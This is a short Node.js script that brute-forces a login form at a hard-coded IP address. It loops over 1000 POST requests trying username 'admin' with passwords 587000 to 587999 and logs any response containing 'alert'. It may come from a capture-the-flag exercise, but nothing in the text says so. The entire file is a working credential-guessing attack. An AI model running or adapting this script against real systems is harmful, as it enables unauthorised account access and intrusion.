var request = require('request');

for(var i=0;i<1000;i++)
request({
    url: 'http://123.56.134.234:8085/check.php',
    method: "POST",
    body: 'username=admin&password=587'+(Array(3).join('0') + i).slice(-3),
    headers : {
      "content-type": "application/x-www-form-urlencoded"
    }
}, function (error, response, body) {
    var data=body+'';
    if(data.search('alert')>=0)console.log(response, body);
})